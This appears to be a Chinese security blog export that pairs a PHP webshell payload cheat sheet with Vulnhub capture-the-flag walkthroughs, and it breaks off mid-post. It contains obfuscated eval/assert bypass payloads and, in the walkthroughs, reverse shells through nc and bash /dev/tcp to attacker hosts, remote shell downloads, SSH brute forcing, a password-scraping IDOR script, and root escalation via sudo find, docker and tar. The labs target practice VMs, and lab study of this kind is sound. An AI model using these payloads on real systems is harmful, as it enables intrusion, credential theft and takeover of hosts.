{"meta":{"title":"欢迎来访哦!","subtitle":null,"description":"学无止境啊!学吧,太深了!","author":"1eng","url":"http://perthinking.xyz","root":"/"},"posts":[{"tags":[],"title":"Webshell总结(一)","date":"2020/06/30","text":"1.源码: if(!preg_match(‘/[a-z0-9]/is’,@$_GET[‘shell’])) { eval(@$_GET[‘shell’]); } Payload: 测试phpinfo 1.${%86%86%86%86^%d9%c1%c3%d2}{%86}();&amp;%86=phpinfo 2.${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo 3.(~%8F%97%8F%96%91%99%90)(); 需要7.0版本以上才能用 4.${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&amp;%fe=phpinfo 同1, 有很多可以异或 _GET 5. $啊=(~%8F%97%8F%96%91%99%90);$啊(); 低版本也可使用2) 直接getshell1.${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27]) //长度小于40 2.$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___=$$__;$_($___[_]); //assert($_POST[_]) 3.(~%9E%8C%8C%9A%8D%8B)((~%DB%A0%AF%B0%AC%AB)[(~%9E)]); //assert($_POST[_]) 经测试,该payload部分情况有用 4.$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=assert&amp;__=eval($_POST[a]) //assert($_POST[a]) 长度小于40 5.(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)())); //(&quot;assert&quot;)((&quot;next&quot;)((&quot;getallheaders&quot;)())); 长度小于40使用方法: 3) 读文件(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((&quot;./&quot;))); -&gt; print_r(scandir(&#39;./&#39;)) (~%8D%9A%9E%9B%99%96%93%9A)((~%D0%99%93%9E%98)); -&gt; Readfile(&#39;/flag&#39;) (~%8C%86%8C%8B%9A%92)((~%8B%86%8F%9A%DF%99%93%9E%98%D1%8F%97%8F)); -&gt; system(type ./flag.php) $啊=(~%8C%86%8C%8B%9A%92);$呵=(~%88%97%90%9E%92%96);$啊($呵); -&gt; system(whoami) print_r(scandir(&#39;.&#39;)); -&gt; ((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); //16个字符 print_r(scandir(.)); -&gt; ((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); //11个字符 show_source(end(scandir(.))); -&gt;((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff))); //13个字符单次异或的话 太局限了 就不贴了","permalink":"http://perthinking.xyz/Webshell/1/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Reconforce-01","date":"2020/06/30","text":"1.nmap -T5 -A 192.168.56.104 -oA reconforce-port 扫描 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.56.103 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA) | 256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA) |_ 256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Recon_Web MAC Address: 08:00:27:7E:93:7F (Oracle VirtualBox virtual NIC) Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel允许匿名登录 没有文件 但有提示 2.扫目录没有东西 访问 要验证 根据之前提示写个组合密码 word = [&#39;5ecure&#39;,&#39;Secruity&#39;,&#39;Secure&#39;,&#39;Recon&#39;] for i in word: print(i + &#39;@hackNos&#39;)-&gt; 5ecure@hackNos Secruity@hackNos Secure@hackNos Recon@hackNos 使用msf的模块登录爆破 -&gt; 3.然后又是ping功能的命令执行 |ls |ls cat out.php &lt;pre&gt; &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $target = trim($_REQUEST[ &#39;ip&#39; ]); // Set blacklist $substitutions = array( ​ &#39;&amp;&#39; =&gt; &#39;&#39;, ​ &#39;;&#39; =&gt; &#39;&#39;, ​ &#39;| &#39; =&gt; &#39;&#39;, ​ &#39;-&#39; =&gt; &#39;&#39;, ​ &#39;$&#39; =&gt; &#39;&#39;, ​ &#39;(&#39; =&gt; &#39;&#39;, ​ &#39;)&#39; =&gt; &#39;&#39;, ​ &#39;`&#39; =&gt; &#39;&#39;, ​ &#39;||&#39; =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { ​ // Windows ​ $cmd = shell_exec( &#39;ping &#39; . $target ); } else { ​ // *nix ​ $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; &lt;/pre&gt; 其中过滤了 |空格 故意加了空格 所以绕过了 故意的? Bash 反弹不过来 原因: shell_exec(“ping -c 3 $pinged”); shell_exec( ‘ping -c 4 ‘ . $target ); 这两个的区别 或者是www-data权限不够 那么将shell下载到靶机 |wget http://192.168.56.103:8081/shell.php 发现靶机有nc 那么用nc反弹 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.104 9001 &gt;/tmp/f 进入python交互shell python -c ‘import pty;pty.spawn(“/bin/bash”)’ 两个用户 Hydra 爆破一下 hydra -l recon -P /home/aleng/vulnhub/password.txt ssh://192.168.56.104 第一个flag 可以执行任何命令 第二个flag docker提权 docker run -v /:/mnt –rm -it alpine chroot /mnt sh docker run -it 容器id -v /:/mbt","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/12/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-haclabs-no_name","date":"2020/06/30","text":"1.先获得主机ip netdiscover 发现ip为 101 2.nmap 扫描一波 nmap -T5 -A 192.168.56.101 -oA hacknoname-port 发现没什么重要的信息 3.目录扫描一波 gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php /admin (Status: 200) /.htpasswd (Status: 403) /.htpasswd.php (Status: 403) /.htaccess (Status: 403) /.htaccess.php (Status: 403) /index.php (Status: 200) /server-status (Status: 403) /superadmin.php (Status: 200)Superadmin.php 很明显 存在命令执行 cat源码 分析以下 &lt;?php if (isset($_POST[&#39;submitt&#39;])) { ​ $word=array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;/&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;); ​ $pinged=$_POST[&#39;pinger&#39;]; ​ $newStr = str_replace($word, &quot;&quot;, $pinged); ​ if(strcmp($pinged, $newStr) == 0) { $flag=1; } ​ else { $flag=0; } } if ($flag==1){ $outer=shell_exec(&quot;ping -c 3 $pinged&quot;); echo &quot;&lt;pre&gt;$outer&lt;/pre&gt;&quot;; } ?&gt;过滤了大部分字符串 没过滤 | 要知道 | 在命令执行中经常要用到 4.写一句话或者反弹shell bash -i &gt;&amp; /dev/tcp/192.168.56.103/8888 0&gt;&amp;1 这样并不能反弹 用base64转一下 echo ‘bash -i &gt;&amp; /dev/tcp/192.168.56.103/8888 0&gt;&amp;1’ | base64 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMy84ODg4IDA+JjEK |echo ‘YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMy84ODg4IDA+JjEK’ | base64 -d|bash 切换到python shell 然而没有弹回来 还不清楚什么原因 python3 -c ‘import pty;pty.spawn(“/bin/bash”)’; python3 -c “import pty;pty.spawn(‘/bin/bash’)”; 那就写一句话 本地测试root和普通用户是成功写入本地 但是靶机执行过后访问404 后来发现是www-data权限不够 所以命令执行是不能写入的 没关系 反弹的shell是交互式shell就行 查看用户 获得yash用户的flag cat /home/yash/flag1.txt 结果返回 Due to some security issues,I have saved haclabs password in a hidden file. 查找此用户的文件 find / -type f -user yash 2&gt;/dev/null cat下隐藏文件 Haclabs1234 是haclabs的密码 第二个用户的flag 登录上后查看sudo权限 也看到了提示 sudo执行命令提权 sudo find . -exec /bin/sh ; -quit 这里 ; 表示find . -exec /bin/sh 这条命令的结束 也是衔接后面的-quit 不然的话执行命令后无法退出 suid提权 find /usr -perm -u=s -type f 2&gt;/dev/null find test -exec /bin/bash -p ; -quit 解析: 查找有root权限的程序 这里用了test 然后利用pkexec 就相当于sudo 然后去执行root权限的程序","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/11/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Djiin","date":"2020/06/30","text":"安装靶机,nmap扫描发现7331端口是http服务,22端口ssh服务被过滤了,21端口允许匿名登陆, 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 0 0 11 Oct 20 23:54 creds.txt | -rw-r--r-- 1 0 0 128 Oct 21 00:23 game.txt |_-rw-r--r-- 1 0 0 113 Oct 21 00:23 message.txt1337端口信息提示: Let’s see how good you are with simple maths Answer my questions 1000 times and I’ll give you your gift 意思是让我们回答1000个问题就给一个大的礼物 用 nc 发起 请求 nc 192.168.245.12 发现是一个计算器,让我们回答1000次数学问题 用python解决即可: #coding: utf-8 import telnetlib import time,re def main(): try: ​ tn = telnetlib.Telnet(&#39;192.168.245.12&#39;,port=1337) except: ​ print(&#39;error&#39;) time.sleep(0.5) loop = 1 while loop &lt; 1002: ​ data = tn.read_very_eager().decode(&#39;ascii&#39;) ​ res = re.search(&#39;(.*?)\\s&gt;&#39;,data).group(1) ​ result = str(calc(res)) ​ print(str(loop) + &#39; &#39; + result) ​ loop = loop + 1 ​ tn.write(result.encode(&#39;ascii&#39;)+b&#39;\\n&#39;) ​ time.sleep(0.1) data = tn.read_very_eager().decode(&#39;ascii&#39;) return data def calc(res): \\#(4, &#39;-&#39;, 6) res_str = res.strip(&#39;(&#39;).replace(&#39; &#39;,&#39;&#39;).strip(&#39;)&#39;) nums = res_str.split(&#39;,&#39;) n1 = nums[0].strip() operator = nums[1].strip().replace(&#39;\\&#39;&#39;,&#39;&#39;) n2 = nums[2].strip() return eval(n1+operator+n2) print(main()) 等了几分钟后礼物出来了 Here is your gift, I hope you know what to do with it: 1356, 6784, 3409 ssh的22端口是可以隐藏在其它端口的,称之为暗语,如果要将端口打开,就要用knock工具打开暗语,然后22端口才能开启 下载knockd工具 尝试将得到的端口打开 knock 192.168.245.12 1356, 6784, 3409 这里试了好多遍,期间重新搭建靶机,才将22端口开启 接下来下载可以匿名登陆的ftp中的文件 登陆后使用help命令: 可以使用mget 或 reget下载文件 将这三个文件下载到本地: creds.txt -&gt; nitu:81299 可能是账号密码 game.txt -&gt; oh and I forgot to tell you I’ve setup a game for you on port 1337. See if you can reach to the final level and get the prize. 这个提示1337端口又信息, 这里1337的端口已经获取到信息了 message.txt -&gt;@nitish81299 I am going on holidays for few days, please take care of all the work. And don’t mess up anything. @nitish81299 可能是账号或密码 记录下来 下面看7331端口获取信息: gobuster 扫目录得到 /wish 目录 访问后发现是一个命令执行 过滤了一些字符 解码后 name=uid=33(www-data) gid=33(www-data) groups=33(www-data) 使用burp进行fuzz看过滤那些字符 先发送到Repeater 分析一下: 有个302重定向 那么跑包时应设置要跑重定向 选择字典 因为kali中burp是社区版 不能设置线程的所以有点慢 可以看到 有几个符号是被过滤了的: 尝试反弹shell bash -i &gt;&amp; /dev/tcp/192.168.245.6/9001 0&gt;&amp;1 在kali对它进行一个url编码 bash+-i+&gt;%26+/dev/tcp/192.168.245.6/9001+0&gt;%261 但是含有 / 符号 是不能反弹成功的 这里用到了linux中利用 | 符号 进行多条命令执行 的知识 cat /etc/passwd 在burp中对它进行一个base64编码, 再本地执行命令 可以看到成功执行命令 那么bash -i &gt;&amp; /dev/tcp/192.168.245.6/9001 0&gt;&amp;1也是同样可以执行的 成功反弹shell: 同样切换到python shell 切换到后台 但是同样的root用户权限和命令 不知道为什么我的不能放到后台 目录下有个app.py: import subprocess from flask import Flask, redirect, render_template, request, url_for app = Flask(__name__) app.secret_key = &quot;key&quot; CREDS = &quot;/home/nitish/.dev/creds.txt&quot; RCE = [&quot;/&quot;, &quot;.&quot;, &quot;?&quot;, &quot;*&quot;, &quot;^&quot;, &quot;$&quot;, &quot;eval&quot;, &quot;;&quot;] def validate(cmd): if CREDS in cmd and &quot;cat&quot; not in cmd: ​ return True try: ​ for i in RCE: ​ for j in cmd: ​ if i == j: ​ return False ​ return True except Exception: ​ return False @app.route(&quot;/&quot;, methods=[&quot;GET&quot;]) def index(): return render_template(&quot;main.html&quot;) @app.route(&quot;/wish&quot;, methods=[&#39;POST&#39;, &quot;GET&quot;]) def wish(): execute = request.form.get(&quot;cmd&quot;) if execute: ​ if validate(execute): ​ output = subprocess.Popen(execute, shell=True, ​ stdout=subprocess.PIPE).stdout.read() ​ else: ​ output = &quot;Wrong choice of words&quot; ​ return redirect(url_for(&quot;genie&quot;, name=output)) else: ​ return render_template(&#39;wish.html&#39;) @app.route(&#39;/genie&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def genie(): if &#39;name&#39; in request.args: ​ page = request.args.get(&#39;name&#39;) else: ​ page = &quot;It&#39;s not that hard&quot; return render_template(&#39;genie.html&#39;, file=page) if __name__ == &quot;__main__&quot;: app.run(host=&#39;0.0.0.0&#39;, debug=True) 分析: 可以看到用了python中的Flask模板程序 if CREDS in cmd and &quot;cat&quot; not in cmd: ​ return True execute = request.form.get(&quot;cmd&quot;) if execute: ​ if validate(execute): ​ output = subprocess.Popen(execute, shell=True, ​ stdout=subprocess.PIPE).stdout.read() 比如这个代码 是可以绕过的 more /home/nitish/.dev/creds.txt 这样的话 cat 不在里面也就返回True 然后执行此条命令 try: ​ for i in RCE: ​ for j in cmd: ​ if i == j: ​ return False ​ return True而这个代码就是过滤字符 RCE = [“/“, “.”, “?”, “*”, “^”, “$”, “eval”, “;”] 所以可以burp抓包拿到 /home/nitish/.dev/creds.txt 或者 直接 cat /home/nitish/.dev/creds.txt 内容: nitish:p4ssw0rdStr3r0n9 应该是账号密码 登陆ssh成功 登陆后目录下有一个user.txt 拿到第一个flag:10aay8289ptgguy1pvfa73alzusyyx3c 接下来想办法提权: sudo -l 查看可执行的程序: (sam) NOPASSWD: /usr/bin/genie 发现sam用户可以不用密码执行 /usr/bin/genie ls -al /usr/bin/genie 再查看 程序权限 -rwsr-x— 1 sam nitish 72000 Nov 11 19:09 /usr/bin/genie 发现sam用户是可以执行这个程序的 再查看genie程序参数: 说可以执行程序或命令 但是没有用 看是否用手册可以查看 可以看到隐藏了 -cmd 参数 可以执行命令 前面了解到sam用户可以不用密码执行 /usr/bin/genie 于是用sudo -u指定sam用户执行程序 发现用户变了 sudo -l 查看可执行程序 root用户不用密码就可以执行/root/lago 程序 但是不能得到有用的信息 用strings 工具 查看程序 也没有权限 这时切换到sam用户目录 有这些文件: .pyc是关键文件 但是要反编译才能得到.py 文件 用nc工具下载到本地 或 base64 转码复制到本地 都行的,只不过base64转码可能太多符号不好弄 这边的话用nc 本地监听端口 nc -lp 9002 &gt; 1.pyc 靶机发送连接 nc 192.168.245.6 9002 &lt;.pyc 用工具uncompyle6 反编译 .pyc pip3 install uncompyle6 先安装工具 编译后得到如下代码: from getpass import getuser from os import system from random import randint def naughtyboi(): print &#39;Working on it!! &#39; def guessit(): num = randint(1, 101) print &#39;Choose a number between 1 to 100: &#39; s = input(&#39;Enter your number: &#39;) if s == num: ​ system(&#39;/bin/sh&#39;) else: ​ print &#39;Better Luck next time&#39; def readfiles(): user = getuser() path = input(&#39;Enter the full of the file to read: &#39;) print &#39;User %s is not allowed to read %s&#39; % (user, path) def options(): print &#39;What do you want to do ?&#39; print &#39;1 - Be naughty&#39; print &#39;2 - Guess the number&#39; print &#39;3 - Read some damn files&#39; print &#39;4 - Work&#39; choice = int(input(&#39;Enter your choice: &#39;)) return choice def main(op): if op == 1: ​ naughtyboi() else: ​ if op == 2: ​ guessit() ​ else: ​ if op == 3: ​ readfiles() ​ else: ​ if op == 4: ​ print &#39;work your ass off!!&#39; ​ else: ​ print &#39;Do something better with your life&#39; if __name__ == &#39;__main__&#39;: main(options()) # okay decompiling 1.pyc #File &#39;-o&#39; doesn&#39;t exist. Skipped #File &#39;1.py&#39; doesn&#39;t exist. Skipped # # Successfully decompiled file 代码正好对应 root/lago 程序的执行结果 很简单,漏洞点出现再弱类型比较: def guessit(): num = randint(1, 101) print &#39;Choose a number between 1 to 100: &#39; s = input(&#39;Enter your number: &#39;) if s == num: ​ system(&#39;/bin/sh&#39;) else: ​ print &#39;Better Luck next time&#39; if s == num: 用的是双等号,没有比较字符类型. 输入 num 即可绕过 然后拿到root权限 第二个flag: Flag:33eur2wjdmq80z47nyy4fx54bnlg3ibc 同时查看下它的lago程序： #!/usr/bin/python2 from getpass import getuser from os import system from os.path import isfile from random import randint def naughtyboi(): # TODO: Get some sexy news, if you know what I mean ;-) print(&quot;Working on it!! &quot;) def check(path): try: ​ if isfile(path): ​ return True ​ else: ​ return False except Exception: ​ return False def guessit(): num = randint(1, 101) print(&quot;Choose a number between 1 to 100: &quot;) try: ​ s = input(&quot;Enter your number: &quot;) ​ if s == num: ​ system(&quot;/bin/sh&quot;) ​ else: ​ print(&quot;Better Luck next time&quot;) except: ​ print(&quot;Slow claps again&quot;) def readfiles(): user = getuser() try: ​ path = raw_input(&quot;Enter the full of the file to read: &quot;) ​ if check(path): ​ print(&quot;User %s is not allowed to read %s&quot; % (user, path)) ​ else: ​ print(&quot;Slow clap for this hacker right here&quot;) except Exception: ​ print(&quot;Slow clap for this hacker right here&quot;) def options(): print(&quot;What do you want to do ?&quot;) print(&quot;1 - Be naughty&quot;) print(&quot;2 - Guess the number&quot;) print(&quot;3 - Read some damn files&quot;) print(&quot;4 - Work&quot;) try: ​ choice = input(&quot;Enter your choice:&quot;) except Exception: ​ print(&quot;\\n&quot;) try: ​ choice = int(choice) ​ return choice except Exception: ​ print(&quot;Man Stop hacking the damn input menu&quot;) def main(op): if op == 1: ​ naughtyboi() elif op == 2: ​ guessit() elif op == 3: ​ readfiles() elif op == 4: ​ print(&quot;work your ass off!!&quot;) else: ​ print(&quot;Do something better with your life&quot;) if __name__ == &quot;__main__&quot;: main(options())可以再看下 1337端口的服务是怎么运行的 netstat -tnlp Locate xinetd查询服务 查看文件 定位到 /etc/xinetd.d 查看game 程序 定位到 /opt/1337/run_challenge.sh 查看最终的程序: #!/usr/bin/env python3 import sys from random import choice, randint from pyfiglet import print_figlet def add(a,b): return a+b def div(a,b): return int(a/b) def multiply(a,b): return a*b def sub(a,b): return a-b print_figlet(&quot;Game Time&quot;) print(&quot;Let&#39;s see how good you are with simple maths&quot;) print(&quot;Answer my questions 1000 times and I&#39;ll give you your gift.&quot;) OPERATIONS = [&#39;+&#39;, &#39;-&#39;, &quot;/&quot;, &quot;*&quot;] def main(): for i in range(1001): ​ a = randint(1,9) ​ b = randint(1,9) ​ op = choice(OPERATIONS) print(a,op,b) ​ if op == &quot;+&quot;: ​ val = add(a,b) ​ if op == &quot;-&quot;: ​ val = sub(a,b) ​ if op == &quot;/&quot;: ​ val = div(a,b) ​ if op == &quot;*&quot;: ​ val = multiply(a,b) ​ try: ​ In = int(input(&quot;&gt; &quot;)) ​ except Exception: ​ print(&quot;Stop acting like a hacker for a damn minute!!&quot;) ​ sys.exit(1) ​ if In == val: ​ continue ​ else: ​ print(&quot;Wrong answer&quot;) ​ sys.exit(1) with open(&quot;/opt/1337/p0rt5&quot;, &#39;r&#39;) as f: ​ print(f.read()) if __name__ == &quot;__main__&quot;: main() 查看/opt/1337/p0rt5 : Here is your gift, I hope you know what to do with it: 1356, 6784, 3409","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Connect-the-dots","date":"2020/06/30","text":"安装靶机,nmap扫描端口及服务: PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 36766/udp mountd | 100005 1,2,3 44555/tcp6 mountd | 100005 1,2,3 52763/udp6 mountd | 100005 1,2,3 55723/tcp mountd | 100021 1,3,4 32812/udp6 nlockmgr | 100021 1,3,4 33025/tcp6 nlockmgr | 100021 1,3,4 40763/tcp nlockmgr | 100021 1,3,4 58422/udp nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) 7822/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 38:4f:e8:76:b4:b7:04:65:09:76:dd:23:4e:b5:69:ed (RSA) | 256 ac:d2:a6:0f:4b:41:77:df:06:f0:11:d5:92:39:9f:eb (ECDSA) |_ 256 93:f7:78:6f:cc:e8:d4:8d:75:4b:c2:bc:13:4b:f0:dd (ED25519) 40681/tcp open mountd 1-3 (RPC #100005) 40763/tcp open nlockmgr 1-4 (RPC #100021) 41697/tcp open mountd 1-3 (RPC #100005) 55723/tcp open mountd 1-3 (RPC #100005)发现nfs共享服务,使用showmount工具探测此服务: showmount -e 192.168.245.11 -&gt; 共享目录/home/morris 使用工具mount 挂载共享目录 mount -t nfs 192.168.245.11:/home/morris dir-gongxiang 更改文件权限时受限: chmod: changing permissions of ‘dir-gongxiang/‘: Read-only file system 那么查看其它端口的信息 gobuster扫描目录 首页有两段英文 翻译后: 你知道我们一家人是怎么给我们取名字的吧？ 他们给我命名为M，而您命名为N。好吧，除了名字缩写，我们的名字完全一样。 寿命太短，无法在您年老时将姓名保存在您的记忆中，所以为什么不呢！ 但是你知道是谁做的吗？ 我们喜欢詹姆斯·邦德电影的母亲。 她以我的名字命名为M。也许，她认为这部电影的导演太懒了，以至于没有想到 我的意思是，谁在乎，对吗？ 哈哈，我知道你也不喜欢我，我这讨厌的笑话。 但是我爱你，兄弟。 因此，在完成操作之前，请不要访问该网站。 除了备份，您什么都找不到，大声笑。 顺便说一句，我知道你喜欢挑战，所以我也为你准备了一些东西。 从这可以得出这个靶机应该有两个用户 morris , norris 又发现 192.168.245.11/mysite/bootstrap.min.cs 是可以下载的 下载打开后发现是jsfuck编码 并且用10个变量分开了 b1,b2,…b10 而且有一个注册页面也引用了这个cs 这里有一个技巧 在注册页面用控制台将它们合并起来 console.log(b1+b2+b3+b4+b5+b6+b7+b8+b9+b10) 合并后使用该网址http://codertab.com/jsunfuck解码得到: alert(“You’re smart enough to understand me. Here’s your secret, TryToGuessThisNorris@2k19”) 使用hydra工具测试是否可登陆ssh hydra -L user -p TryToGuessThisNorris@2k19 ssh://192.168.245.11 -s 7822 发现norris可登陆 拿到第一个flag: 2c2836a138c0e7f7529aa0764a6414d0 发现ftp文件夹中有可疑文件 加上前面扫到21端口 用ftp登陆下载可疑文件 exiftool查看图片详细信息 exiftool game.gif.bak 发现有摩斯电码 解码后得到: HEY NORRIS, YOU’VE MADE THIS FAR. FAR FAR FROM HEAVEN WANNA SEE HELL NOW? HAHA YOU SURELY MISSED ME, DIDN’T YOU? OH DAMN MY BATTERY IS ABOUT TO DIE AND I AM UNABLE TO FIND MY CHARGER SO QUICKLY LEAVING A HINT IN HERE BEFORE THIS SYSTEM SHUTS DOWN AUTOMATICALLY. I AM SAVING THE GATEWAY TO MY DUNGEON IN A ‘SECRETFILE’ WHICH IS PUBLICLY ACCESSIBLE. 翻译后: 嗨，诺里斯，您做了这个。 从天堂湾（WANA WANNA）出发的远方现在看到地狱吗？ 哈哈，你一定想我了，不是吗？ 噢，我的电池即将死，在系统自动关闭之前，我无法快速找到提示，所以无法找到我的充电器。 我正在“可访问的”“秘密文件”中保存通往我的地下城的网关。 这里定位关键词 SECRETFILE find命令查找一下 find / -name SECRETFILE 2&gt;/dev/null 发现未找到 再用小写试下 find / -name secretfile 2&gt;/dev/null -&gt; /var/www/html/secretfile cat 下 -&gt; I see you’re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference. 发现也没什么重要信息,但提示没电了,linux在文本编辑时意外断开的话是会创建备份的 查询下隐藏文件 隐藏了 .secretfile.swp 读取时没权限 那么将它下载到本机 用strings 工具查看得到可疑字符串 blehguessme090 前面了解到这个靶机有两个用户,那么这个用户可能是不是另一个用户morris的密码? ssh尝试登陆后成功 没有sudo权限等执行程序可利用 Tar提权: 在norris用户上可以使用tar命令 使用命令查看tar权限 /sbin/getcap -r / 2&gt;/dev/null -&gt; /usr/bin/tar = cap_dac_read_search+ep 发现有读取和搜索文件的权限 使用tar将/root目录打包到/tmp中 tar -zcvf /tmp/root.tar.gz /root 切换到tmp目录中 解压 tar -zvxf root.tar.gz 拿到第二个flag:8fc9376d961670ca10be270d52eda423","permalink":"http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/9/","photos":[]},{"tags":[],"title":"Vulnhub靶场做题记录-Me_and_mygirlfriend","date":"2020/06/30","text":"安装靶机,nmap探测目标ip，端口，服务等 进入首页,提示要本地才能访问 . 用 X-Forwarded-For Header插件设定127.0.0.1 随便注册一个用户测试发现url参数:index.php?page=dashboard&amp;user_id=13 发现 index.php?page=profile&amp;user_id=13 有越权访问 修改user_id便能查看其它用户的密码 写一个python脚本将这些用户名和密码都爬取下来: #coding:utf-8 import requests,re def get_userinfo(id): header = {&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0&quot;,&quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;} cookie = {&quot;PHPSESSID&quot;:&quot;cpjq84n46oeupta6g0v0j0r374&quot;} data = requests.get(url=&quot;http://192.168.245.10/index.php?page=profile&amp;user_id=%s&quot; % id,headers=header,cookies=cookie).text # &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot; value=&quot;Eweuh Tandingan&quot;&gt;&lt;br&gt; name = re.search(&#39;&quot;name&quot;\\svalue=&quot;(.*?)&quot;&#39;,data).group(1) username = re.search(&#39;&quot;username&quot;\\svalue=&quot;(.*?)&quot;&#39;,data).group(1) password = re.search(&#39;&quot;password&quot;\\svalue=&quot;(.*?)&quot;&#39;,data).group(1) return name,username,password for id in range(1,10): name,username,password = get_userinfo(id) if name: print(username + &quot;:&quot; + password) 将内容保存 userinfo 使用hydra测试ssh是否可登陆 hydra -C userinfo ssh://192.168.245.10 测试发现alice:4lic3 可以登陆ssh 拿到第一个flag:gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09} 提权: sudo -l 查看可执行的程序 (root) 